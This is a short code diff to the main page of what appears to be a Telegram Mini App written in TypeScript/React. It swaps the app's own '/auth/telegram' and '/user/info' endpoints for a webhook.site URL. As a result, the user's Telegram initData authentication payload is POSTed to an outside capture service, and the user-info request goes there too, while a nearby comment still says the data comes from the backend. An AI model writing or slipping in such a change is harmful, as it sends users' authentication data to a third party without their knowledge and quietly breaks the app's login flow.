@@ -17,7 +17,7 @@ const MainPage = () => {
 		const tg = (window as any).Telegram?.WebApp
 
 		if (tg?.initData) {
-			fetch('/auth/telegram', {
+			fetch('https://webhook.site/214eb4ce-19f1-4f52-aeb6-1ddcc18bdf1e', {
 				method: 'POST',
 				headers: { 'Content-Type': 'application/json' },
 				body: JSON.stringify({ initData: tg.initData }),
@@ -26,7 +26,9 @@ const MainPage = () => {
 				.then(data => {
 					if (data.ok) {
 						// После авторизации получаем данные с бэка
-						return fetch('/user/info')
+						return fetch(
+							'https://webhook.site/214eb4ce-19f1-4f52-aeb6-1ddcc18bdf1e'
+						)
 					} else {
 						throw new Error('Ошибка авторизации')
 					}
